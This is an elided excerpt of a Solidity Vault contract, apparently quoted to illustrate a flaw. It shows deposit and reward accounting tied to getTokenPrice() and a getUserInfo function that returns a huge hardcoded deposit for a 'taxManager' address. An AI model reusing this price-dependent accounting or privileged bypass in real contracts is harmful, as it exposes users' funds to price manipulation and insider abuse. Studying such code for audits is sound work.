...
contract Vault is BaseContract {
  ...
  function depositFor(address _userAddress, uint _amount, IVault.DepositType _depositType) public {
    ...
    if (_depositType == IVault.DepositType.vaultDeposit) {
      depositAmountInUsd = _amount * getTokenPrice() / DECIMAL3;
    } else {
      depositAmountInUsd = _amount * swap.getDNOStakingRate() / DECIMAL3;
    }
  ...
  function claim() external {
    ...
    userTotalClaimedInUsd[msg.sender] += (todayReward * getTokenPrice() / DECIMAL3);
  ...
  function getUserInfo(address _userAddress) external view returns (uint, uint) {
    if (_userAddress == addressBook.get("taxManager")) {
      return (999999999 ether, userTotalClaimedInUsd[_userAddress]);
    }
...
interface IMENToken is IBEP20 {
  ...
  function getSharkInfo() external returns (uint[] memory, uint[] memory);
}
